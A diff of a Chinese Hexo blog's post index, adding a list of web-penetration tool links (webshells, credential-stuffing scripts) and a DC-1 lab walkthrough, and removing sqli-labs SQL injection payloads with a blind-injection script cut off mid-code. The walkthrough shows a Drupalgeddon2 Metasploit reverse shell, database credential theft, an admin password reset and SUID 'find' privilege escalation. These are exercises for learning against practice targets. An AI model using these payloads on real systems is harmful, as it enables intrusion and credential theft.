+<h1 id="Web渗透（禁止用作违法）"><a href="#Web渗透（禁止用作违法）" class="headerlink" title="Web渗透（禁止用作违法）"></a>Web渗透（禁止用作违法）</h1><p>HTTP暴力破解，撞库攻击脚本：<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>webshell：<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>免杀webshell无限生成工具：<br><a href="https://github.com/yzddmr6/webshell-venom">https://github.com/yzddmr6/webshell-venom</a><br>渗透工具合集：<br><a href="https://github.com/rootphantomer/hack_tools_for_me">https://github.com/rootphantomer/hack_tools_for_me</a><br>XSSOR-方便XSS与CSRF的工具：<br><a href="https://github.com/evilcos/xssor2">https://github.com/evilcos/xssor2</a><br>w3af-Web应用程序攻击和审核框架：<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>渗透测试包：<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>网络路径扫描仪：<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>代码注入检测工具： <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a> hackUtils：<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>Nikto Web服务器扫描仪：<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>自动化的多合一OS命令注入和利用工具：<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>sslscan测试：<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>Windows安全工具套件：<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>Apache实时日志分析器系统：<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>检测网络入侵的特征，恶意蜘蛛（Malspider）：<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>下一代网络扫描仪WhatWeb：<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>WPScan，WordPress漏洞扫描程序：<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>【sqlmap】:<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>SQLi-Hunter(HTTP代理服务器和一个SQLMAP API包装器):<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
+<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Web应用程序模糊器：<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
+<h1 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：<br><a href="https://webgoat.github.io/WebGoat/">https://webgoat.github.io/WebGoat/</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，安全方案生成器（SecGen）：<br><a href="https://github.com/cliffe/secgen">https://github.com/cliffe/secgen</a><br>VulApps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a><br>ZVuldrill Web突破演练平台：<br><a href="https://github.com/710leo/ZVulDrill">https://github.com/710leo/ZVulDrill</a><br>WebGoat旧版：<br><a href="https://github.com/WebGoat/WebGoat-Legacy">https://github.com/WebGoat/WebGoat-Legacy</a></p>
+]]></content>
       <categories>
-        <category>Hexo</category>
+        <category>工具手册</category>
       </categories>
       <tags>
-        <tag>Hexo</tag>
+        <tag>工具手册</tag>
       </tags>
   </entry>
   <entry>
@@ -707,18 +897,6 @@
       </tags>
   </entry>
   <entry>
-    <title>kali安装pip2</title>
-    <url>/posts/6b338ac1/</url>
-    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>idea激活</title>
     <url>/posts/b49b0221/</url>
     <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
@@ -731,15 +909,149 @@
       </tags>
   </entry>
   <entry>
-    <title>phpstudy访问localhost不出现目录的问题</title>
-    <url>/posts/2704909e/</url>
-    <content><![CDATA[<h4 id="新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’"><a href="#新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’" class="headerlink" title="新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’"></a>新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’</h4><p><img src="phpstudy1.png"></p>
-]]></content>
+    <title>hexo文章插入图片</title>
+    <url>/posts/7ecd88c4/</url>
+    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>phpstudy</category>
+        <category>Hexo</category>
       </categories>
       <tags>
-        <tag>phpstudy</tag>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装pip2</title>
+    <url>/posts/6b338ac1/</url>
+    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DCchallenges1</title>
+    <url>/posts/7debd13b/</url>
+    <content><![CDATA[<p>安装</p>
+<p>下载解压后使用Vmware打开ova文件，选择桥接模式，同时也将kali设置为桥接模式</p>
+<br/>
+
+<p>环境</p>
+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.130</p>
+</blockquote>
+<br/>
+
+<p>扫描网段</p>
+<blockquote>
+<p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
+</blockquote>
+<br/>
+
+<p>扫描靶机开放的端口</p>
+<blockquote>
+<p><strong>sudo nmap -sS 192.168.18.130</strong></p>
+<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
+<p>注：sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限</p>
+</blockquote>
+<p>发现开放了80端口，就用浏览器去访问一下<code>192.168.18.130:80</code> 根据网站页面显示信息可以判断是Drupal的CMS</p>
+<p>用dirsearch扫一下看看有什么</p>
+<blockquote>
+<p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
+</blockquote>
+<p>用dirb 扫一下试试</p>
+<blockquote>
+<p><strong>dirb <a href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
+</blockquote>
+<p>没找到啥有用的信息，看下robots.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: &#x2F;includes&#x2F;</span><br><span class="line">Disallow: &#x2F;misc&#x2F;</span><br><span class="line">Disallow: &#x2F;modules&#x2F;</span><br><span class="line">Disallow: &#x2F;profiles&#x2F;</span><br><span class="line">Disallow: &#x2F;scripts&#x2F;</span><br><span class="line">Disallow: &#x2F;themes&#x2F;</span><br><span class="line"># Files</span><br><span class="line">Disallow: &#x2F;CHANGELOG.txt</span><br><span class="line">Disallow: &#x2F;cron.php</span><br><span class="line">Disallow: &#x2F;INSTALL.mysql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.pgsql.txt</span><br><span class="line">Disallow: &#x2F;INSTALL.sqlite.txt</span><br><span class="line">Disallow: &#x2F;install.php</span><br><span class="line">Disallow: &#x2F;INSTALL.txt</span><br><span class="line">Disallow: &#x2F;LICENSE.txt</span><br><span class="line">Disallow: &#x2F;MAINTAINERS.txt</span><br><span class="line">Disallow: &#x2F;update.php</span><br><span class="line">Disallow: &#x2F;UPGRADE.txt</span><br><span class="line">Disallow: &#x2F;xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: &#x2F;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;search&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;user&#x2F;logout&#x2F;</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: &#x2F;?q&#x3D;admin&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;comment&#x2F;reply&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;filter&#x2F;tips&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;node&#x2F;add&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;search&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;password&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;register&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;login&#x2F;</span><br><span class="line">Disallow: &#x2F;?q&#x3D;user&#x2F;logout&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>没什么有用的信息</p>
+<br/>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix&#x2F;webapp&#x2F;drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">&#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: &#x2F;var&#x2F;www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">发现下面有个falg4  flag4:x:1001:1001:Flag4,,,:&#x2F;home&#x2F;flag4:&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;home&#x2F;flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看网站配置 看有什么有用信息</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;site&#x2F;default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#39;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"> </span><br><span class="line">$databases &#x3D; array (</span><br><span class="line">  &#39;default&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;default&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#39;database&#39; &#x3D;&gt; &#39;drupaldb&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</span><br><span class="line">      &#39;host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">      &#39;port&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p>用python反弹个交互式shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<br/>
+
+<br/>
+
+<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>顺便得到了数据库信息，登录数据库看看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www&#x2F;sites&#x2F;default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and&#x2F;or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and&#x2F;or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia&#x2F;Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia&#x2F;Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupal密码的加密是破解不出来，需要重置管理的密码(加密脚本位置在网站根目录下的scripts&#x2F;password-hash.sh)</span><br><span class="line">php scripts&#x2F;password-hash.sh admin  (admin是你要设置的新密码)</span><br><span class="line"></span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh admin</span><br><span class="line">php scripts&#x2F;password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">去数据库修改密码</span><br><span class="line">mysql&gt; update users set pass &#x3D;&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">重置完密码后登录网站 (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="DCchallenges1.png"></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<p>但是发现当前权限不够</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>使用<code>find</code>提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec ls &#x2F;root \;</span><br><span class="line">find dctest -exec ls &#x2F;root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
+<p><a href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
+<p><a href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
+<p><a href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
+<p><a href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
+<p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
       </tags>
   </entry>
   <entry>
@@ -1080,97 +1392,15 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs5</title>
-    <url>/posts/fdded023/</url>
-    <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br/>
-
-<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
-<br/>
-
-<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
-<p>dbs challenges</p>
-<p>table qpu4f7zhcb</p>
-<p>columns  sessid,secret_6KIK,tryy</p>
-<br/>
-
-<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
-<br/>
-
-<p>id=0’ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  –+</p>
-<br/>
-
-<br/>
-
-<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>闭合 </p>
-<p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
-<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
-<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
-<p>secret_MCQ1</p>
-<p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
-<br/>
-
-<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>闭合 方法还是一样的</p>
-<br/>
-
-<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
-<br/>
-
-<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>使用<code>?id=1 and 1=1 union select 1,2,3</code>无回显</p>
-<p>尝试报错注入</p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
-<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
-<br/>
-
-<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>数字型 和58一样</p>
-<p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
-<br/>
-
-<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>用<code>&quot;)</code>闭合 和58一样</p>
-<br/>
-
-<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>用<code>&#39;))</code>闭合</p>
-<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
-<br/>
-
-<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>用<code>&#39;)</code>闭合 这关没回显 使用时间盲注</p>
-<p>根据前面几关可以得到</p>
-<p>数据库为 challenges</p>
-<p>table 是随机10为字符组成</p>
-<p>column是secret_ 和四位随机字符组成 </p>
-<p>本关限制重置次数为130次，可以写个python脚本试一下</p>
-<br/>
-
-<br/>
-
-<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
-<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
-<br/>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#已知表长为10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelina是正常页面下的结果</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 